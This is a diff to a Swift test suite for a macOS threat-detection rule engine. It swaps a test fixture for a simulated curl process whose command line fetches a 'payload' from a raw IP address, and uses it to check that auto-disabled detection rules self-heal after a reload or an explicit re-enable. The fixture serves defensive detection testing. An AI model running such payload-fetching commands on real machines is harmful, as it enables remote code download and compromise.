@@ -149,6 +149,20 @@ struct CorrDetectionAuditFixTests {
         return Event(eventCategory: .process, eventType: .start, eventAction: "exec", process: p)
     }
     private let nvramRuleId = "d1a2b3c4-0342-4000-a000-000000000342"
+    /// Auto-disable applies only to rules with a regex predicate.
+    private let rawIPRuleId = "d1a2b3c4-0043-4000-a000-000000000043"
+    private func curlRawIPEvent() -> Event {
+        let p = MacCrabCore.ProcessInfo(
+            pid: 4322, ppid: 1, rpid: 1, name: "curl",
+            executable: "/usr/bin/curl",
+            commandLine: "curl -s http://203.0.113.7/payload",
+            args: ["/usr/bin/curl"], workingDirectory: "/tmp",
+            userId: 501, userName: "t", groupId: 20, startTime: Date(),
+            codeSignature: nil,
+            ancestors: [ProcessAncestor(pid: 1, executable: "/bin/bash", name: "bash")],
+            architecture: "arm64", isPlatformBinary: false)
+        return Event(eventCategory: .process, eventType: .start, eventAction: "exec", process: p)
+    }
 
     @Test("#276: a clean reload re-enables a runtime-auto-disabled rule (self-heal)")
     func reloadSelfHealsAutoDisabled() async throws {
@@ -158,14 +172,14 @@ struct CorrDetectionAuditFixTests {
         let engine = RuleEngine(slowRuleThresholdNs: 1, autoDisableMaxBreaches: 3)
         _ = try await engine.loadRules(from: dir)
 
-        for _ in 0..<4 { _ = await engine.evaluate(nvramEvent()) }
-        #expect(await engine.autoDisabledRules.contains(nvramRuleId),
+        for _ in 0..<4 { _ = await engine.evaluate(curlRawIPEvent()) }
+        #expect(await engine.autoDisabledRules.contains(rawIPRuleId),
                 "precondition: the rule is auto-disabled by the eval-budget guard")
 
         _ = try await engine.reloadRules(from: dir)
-        #expect(!(await engine.autoDisabledRules.contains(nvramRuleId)),
+        #expect(!(await engine.autoDisabledRules.contains(rawIPRuleId)),
                 "a clean reload must clear the runtime auto-disable (no permanent silencing)")
-        #expect(await engine.evaluate(nvramEvent()).contains { $0.ruleId == nvramRuleId },
+        #expect(await engine.evaluate(curlRawIPEvent()).contains { $0.ruleId == rawIPRuleId },
                 "the rule must fire again after the self-healing reload")
     }
 
@@ -188,13 +202,13 @@ struct CorrDetectionAuditFixTests {
         let engine = RuleEngine(slowRuleThresholdNs: 1, autoDisableMaxBreaches: 3)
         _ = try await engine.loadRules(from: compiledRulesDirectory)
 
-        for _ in 0..<4 { _ = await engine.evaluate(nvramEvent()) }
-        #expect(await engine.autoDisabledRules.contains(nvramRuleId))
+        for _ in 0..<4 { _ = await engine.evaluate(curlRawIPEvent()) }
+        #expect(await engine.autoDisabledRules.contains(rawIPRuleId))
 
-        await engine.setEnabled(nvramRuleId, enabled: true)
-        #expect(!(await engine.autoDisabledRules.contains(nvramRuleId)),
+        await engine.setEnabled(rawIPRuleId, enabled: true)
+        #expect(!(await engine.autoDisabledRules.contains(rawIPRuleId)),
                 "explicit re-enable must drop the rule from autoDisabledRules")
-        #expect(await engine.evaluate(nvramEvent()).contains { $0.ruleId == nvramRuleId },
+        #expect(await engine.evaluate(curlRawIPEvent()).contains { $0.ruleId == rawIPRuleId },
                 "the rule fires again after an explicit re-enable")
     }
 
